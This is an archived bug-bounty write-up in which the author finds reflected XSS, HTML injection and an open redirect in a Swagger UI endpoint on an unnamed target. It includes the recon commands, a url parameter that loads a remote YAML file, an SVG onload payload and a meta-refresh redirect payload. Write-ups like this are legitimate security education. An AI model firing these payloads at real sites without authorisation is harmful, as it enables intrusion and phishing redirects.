# Single XSS with Earn $600

- **Source URL:** https://medium.com/@yeyinthtet305/single-xss-with-earn-600-c1199f5c7fce?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142114/https://medium.com/@yeyinthtet305/single-xss-with-earn-600-c1199f5c7fce
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3807 (id 3807)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Single XSS with Earn $600

my name is ye yint htet i’m bug bounty hunter from myanmar today i’m sharing how i’m found xss vuln and this bug with i’m earned $600

let’s dive into our story

i’m not have permission for company name disclosed let’s call target.com first step is simple i’m make subdomain enumeration

subfinder -d target.com -silent -o list.txt

second step also simple thing i’m checking what domain is alive or not

httpx -l list.txt -sc — title > httpx\_target.txt

now i’m open alive domain list and oen of their subdomain is redirect me port 4343 and showing me connection time out

this is interested thing so i’m start make directory brute force in this domain

then i’m found this interested path /api/

then i’m open it in my firefox broswer [https://subdomain.target.com/api/](https://subdomain.target.com/api/)

this domain in they are use swagger ui now i’m start testing swagger ui xss

[https://subdomain.target.com](https://subdomain.target.com)/api/index.`html?url=https://jumpy-floor.surge.sh/test.yaml`

then alert is pop up then i’m inject this url paramter in also \<h1>Hello\</h1> this is reflect Hello so this parameter have also html injection i’m inject xss payload like this url=”xss>\<svg/onload=alert()> then again alert is pop up

i’m also found open redirect https://subdomain.target.com/api/index.html?url=`<meta http-equiv="Refresh" content="0; url='https://www.google.com'" /> you are redirect google.com if you found html injection you can test this`

Reference: [https://vidocsecurity.ghost.io/blog/hacking-swagger-ui-from-xss-to-account-takeovers/](https://vidocsecurity.ghost.io/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)

Report To Program : 18 Aug 2023 11:30:26 UTC

Triage : 31 Aug 2023 04:20:21 UTC

Reward: 31 Aug 2023 19:22:13 UTC
